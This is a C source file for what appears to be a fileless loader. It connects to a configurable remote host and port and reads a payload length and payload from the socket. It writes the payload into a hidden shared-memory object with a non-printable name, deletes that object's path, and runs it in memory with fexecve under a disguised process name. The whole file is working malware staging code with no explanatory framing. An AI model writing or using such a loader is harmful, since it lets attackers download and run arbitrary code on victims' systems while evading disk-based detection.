#include <fcntl.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/mman.h> 
#include <sys/stat.h> 
#include <unistd.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <string.h>


static char *args[] = { 
    "hic et nunc", 
    "-l", 
    "/dev/shm", 
    NULL 
};


extern char **environ;


static int
sock_connect( const char *ip, int port ) {
    struct sockaddr_in serv_addr; 
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if( sockfd < 0 ) return sockfd;

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if( inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0 ) {
        return -1;
    }

    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0 ) {
        return -2;
    }

    return sockfd;
}


static unsigned int
sock_readint( int sockfd ) {
    unsigned int ret = 0;
    if( read(sockfd, &ret, 4) != 4 ) {
        return 0;
    }
    return ntohl(ret);
}


static int
sock_exec( int sockfd, uint32_t nbytes )
{
    char *ptr, *buf;
    int shm_fd, rc, nbread = 0;

    shm_fd = shm_open("\254", O_RDWR | O_CREAT, 0777); 
    if (shm_fd == -1) { 
        perror("shm_open"); 
        return 1;
    }

    rc = ftruncate(shm_fd, nbytes); 
    if (rc == -1) { 
        perror("ftruncate"); 
        return 2;
    } 

    buf = ptr = (char *)mmap(NULL, nbytes, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0); 
    if (ptr == MAP_FAILED) { 
        perror("mmap"); 
        return 3;
    }

    while( nbread < nbytes ) { 
        rc = read(sockfd, buf, nbytes - nbread); 
        if (rc < 0) { 
            perror("read");
            return 4;
        }
        buf += rc;
        nbread += rc;
    }

    munmap(ptr, nbytes); 
    close(shm_fd); 
    
    shm_fd = shm_open("\254", O_RDONLY, 0);
    remove("/dev/shm/\254");

    fexecve(shm_fd, args, environ); 
    perror("fexecve"); 
    return 0;
}


int
main( int argc, char **argv ) {
    const char *ip_addr = "127.0.0.1";
    int port = 38248;
    int rc = -1;
    if( argc > 1 ) {
        ip_addr = argv[1];
        if( argc > 2 ) {
            port = atoi(argv[2]);            
        }
    }

    // TODO: error checking
    int sockfd = sock_connect(ip_addr, port);
    if( sockfd < 0 ) {
        perror("sock_connect");
        return 2;
    }

    uint32_t nbytes = sock_readint(sockfd);
    printf("Reading %u bytes\n", nbytes);
    if( nbytes > 0 ) {
        rc = sock_exec(sockfd, nbytes);
    }

    close(sockfd);
    return rc == 0 ? 0 : 3;
}

